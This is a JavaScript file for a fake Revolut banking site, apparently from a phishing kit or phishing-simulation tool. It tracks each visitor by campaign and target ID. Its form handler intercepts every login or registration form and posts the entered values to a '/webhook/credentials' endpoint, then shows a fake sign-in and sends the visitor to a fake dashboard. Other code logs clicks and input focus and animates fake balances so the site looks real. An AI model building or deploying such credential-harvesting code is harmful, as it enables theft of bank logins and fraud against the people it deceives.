/**
 * Revolut Fake Site - Interaction Tracking
 * Tracks user interactions and redirects to real Revolut after threshold
 */

class RevolutTracker {
    constructor() {
        this.sessionKey = 'revolut_interactions';
        this.maxInteractions = 12; // Redirect after 12 interactions (more generous for better UX)
        this.redirectUrl = 'https://revolut.com';
        this.interactions = this.getInteractionCount();
        this.campaignId = this.getCampaignId();
        this.targetId = this.getTargetId();
        
        this.init();
    }
    
    init() {
        this.bindEvents();
        this.trackPageView();
        this.checkRedirectThreshold();
    }
    
    bindEvents() {
        // Track clicks on any interactive element
        document.addEventListener('click', (e) => {
            this.trackInteraction('click', {
                element: e.target.tagName,
                className: e.target.className,
                text: e.target.textContent?.substring(0, 50)
            });
        });
        
        // Track form submissions
        document.addEventListener('submit', (e) => {
            this.trackInteraction('form_submit', {
                formId: e.target.id,
                action: e.target.action
            });
        });
        
        // Track form focus events
        document.addEventListener('focus', (e) => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                this.trackInteraction('form_focus', {
                    inputType: e.target.type,
                    inputName: e.target.name
                });
            }
        }, true);
        
        // Track navigation clicks
        const navLinks = document.querySelectorAll('.nav-link, .quick-action');
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                this.trackInteraction('navigation', {
                    href: link.href,
                    text: link.textContent?.trim()
                });
            });
        });
    }
    
    trackPageView() {
        this.sendTrackingData('page_visit', {
            url: window.location.href,
            referrer: document.referrer,
            timestamp: new Date().toISOString()
        });
    }
    
    trackInteraction(type, data = {}) {
        this.interactions++;
        this.setInteractionCount(this.interactions);
        
        // Send tracking data to server
        this.sendTrackingData('interaction', {
            type: type,
            count: this.interactions,
            data: data,
            timestamp: new Date().toISOString()
        });
        
        // Show subtle loading indicators to simulate real processing
        this.showProcessingFeedback();
        
        // Check if we should redirect
        this.checkRedirectThreshold();
    }
    
    checkRedirectThreshold() {
        if (this.interactions >= this.maxInteractions) {
            // Small delay to make it feel more natural
            setTimeout(() => {
                this.performRedirect();
            }, 1000 + Math.random() * 2000); // 1-3 seconds delay
        }
    }
    
    performRedirect() {
        // Track the redirect event
        this.sendTrackingData('redirect_to_crash', {
            interactions: this.interactions,
            timestamp: new Date().toISOString()
        });
        
        // Redirect to crash page instead of directly to real site
        setTimeout(() => {
            window.location.href = '/revolut/crash';
        }, 500);
    }
    
    showProcessingFeedback() {
        // Add subtle loading indicators to buttons when clicked
        const buttons = document.querySelectorAll('.btn');
        buttons.forEach(btn => {
            const originalText = btn.textContent;
            if (btn.matches(':hover')) {
                btn.innerHTML = '<span class="loading"></span> ' + originalText;
                setTimeout(() => {
                    btn.textContent = originalText;
                }, 800);
            }
        });
    }
    
    sendTrackingData(eventType, data) {
        const trackingData = {
            campaign_id: this.campaignId,
            target_id: this.targetId,
            event_type: eventType,
            event_data: data,
            user_agent: navigator.userAgent,
            session_id: this.getSessionId(),
            timestamp: new Date().toISOString()
        };
        
        // Send to tracking endpoint
        fetch('/webhook/page', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(trackingData)
        }).catch(err => {
            console.debug('Tracking request failed:', err);
        });
    }
    
    // Session management
    getInteractionCount() {
        return parseInt(sessionStorage.getItem(this.sessionKey) || '0');
    }
    
    setInteractionCount(count) {
        sessionStorage.setItem(this.sessionKey, count.toString());
    }
    
    clearSession() {
        sessionStorage.removeItem(this.sessionKey);
    }
    
    getSessionId() {
        let sessionId = sessionStorage.getItem('revolut_session_id');
        if (!sessionId) {
            sessionId = this.generateSessionId();
            sessionStorage.setItem('revolut_session_id', sessionId);
        }
        return sessionId;
    }
    
    generateSessionId() {
        return 'revolut_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
    
    getCampaignId() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('c') || 'unknown';
    }
    
    getTargetId() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('t') || 'unknown';
    }
}

/**
 * Form handling for credential capture
 */
class RevolutFormHandler {
    constructor() {
        this.init();
    }
    
    init() {
        this.bindFormSubmissions();
    }
    
    bindFormSubmissions() {
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            form.addEventListener('submit', (e) => {
                this.handleFormSubmit(e);
            });
        });
    }
    
    handleFormSubmit(e) {
        e.preventDefault();
        
        const form = e.target;
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());
        
        // Show loading state
        const submitBtn = form.querySelector('[type="submit"]');
        const originalText = submitBtn.textContent;
        submitBtn.innerHTML = '<span class="loading"></span> Signing in...';
        submitBtn.disabled = true;
        
        // Capture credentials
        this.captureCredentials(data, form);
        
        // Simulate processing time
        setTimeout(() => {
            // Redirect based on form type
            if (form.classList.contains('login-form') || form.action.includes('login')) {
                window.location.href = '/revolut/dashboard';
            } else if (form.classList.contains('register-form') || form.action.includes('register')) {
                window.location.href = '/revolut/verify';
            } else {
                // Default redirect
                window.location.href = '/revolut/dashboard';
            }
        }, 2000 + Math.random() * 1000); // 2-3 seconds processing time
    }
    
    captureCredentials(data, form) {
        const campaignId = new URLSearchParams(window.location.search).get('c') || 'unknown';
        const targetId = new URLSearchParams(window.location.search).get('t') || 'unknown';
        
        const credentialData = {
            campaign_id: campaignId,
            target_id: targetId,
            form_data: data,
            page_url: window.location.href,
            referrer: document.referrer,
            user_agent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            form_fields: this.getFormFieldsInfo(form)
        };
        
        // Send to credential capture endpoint
        fetch('/webhook/credentials', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(credentialData)
        }).catch(err => {
            console.debug('Credential capture failed:', err);
        });
    }
    
    getFormFieldsInfo(form) {
        const fields = [];
        const inputs = form.querySelectorAll('input, select, textarea');
        
        inputs.forEach(input => {
            fields.push({
                name: input.name,
                type: input.type,
                placeholder: input.placeholder,
                required: input.required
            });
        });
        
        return fields;
    }
}

/**
 * UI Enhancements for realistic experience
 */
class RevolutUI {
    constructor() {
        this.init();
    }
    
    init() {
        this.addRealTimeElements();
        this.simulateDataLoading();
        this.addInteractiveElements();
    }
    
    addRealTimeElements() {
        // Update time display if present
        const timeElements = document.querySelectorAll('.current-time');
        timeElements.forEach(el => {
            this.updateTime(el);
            setInterval(() => this.updateTime(el), 1000);
        });
        
        // Simulate balance updates
        const balanceElements = document.querySelectorAll('.dashboard-balance');
        balanceElements.forEach(el => {
            this.animateBalance(el);
        });
    }
    
    updateTime(element) {
        const now = new Date();
        element.textContent = now.toLocaleTimeString();
    }
    
    animateBalance(element) {
        const originalText = element.textContent;
        let counter = 0;
        const target = parseFloat(originalText.replace(/[^0-9.]/g, '')) || 1234.56;
        
        const animation = setInterval(() => {
            counter += target / 50;
            if (counter >= target) {
                counter = target;
                clearInterval(animation);
            }
            element.textContent = element.textContent.replace(/[\d,]+\.?\d*/, counter.toLocaleString('en-US', {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            }));
        }, 20);
    }
    
    simulateDataLoading() {
        // Add loading states to cards that would fetch data
        const cards = document.querySelectorAll('.dashboard-card');
        cards.forEach((card, index) => {
            setTimeout(() => {
                card.style.opacity = '0.5';
                setTimeout(() => {
                    card.style.opacity = '1';
                    card.style.transform = 'translateY(0)';
                }, 300 + index * 100);
            }, index * 200);
        });
    }
    
    addInteractiveElements() {
        // Add hover effects to clickable elements
        const clickables = document.querySelectorAll('.quick-action, .nav-link, .btn');
        clickables.forEach(el => {
            el.addEventListener('mouseenter', function() {
                this.style.transform = 'translateY(-2px)';
            });
            
            el.addEventListener('mouseleave', function() {
                this.style.transform = 'translateY(0)';
            });
        });
    }
}

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Only initialize on Revolut pages
    if (window.location.pathname.includes('/revolut')) {
        window.revolutTracker = new RevolutTracker();
        window.revolutFormHandler = new RevolutFormHandler();
        window.revolutUI = new RevolutUI();
    }
});

// Export for external use if needed
window.RevolutTracker = RevolutTracker;
window.RevolutFormHandler = RevolutFormHandler;
window.RevolutUI = RevolutUI;
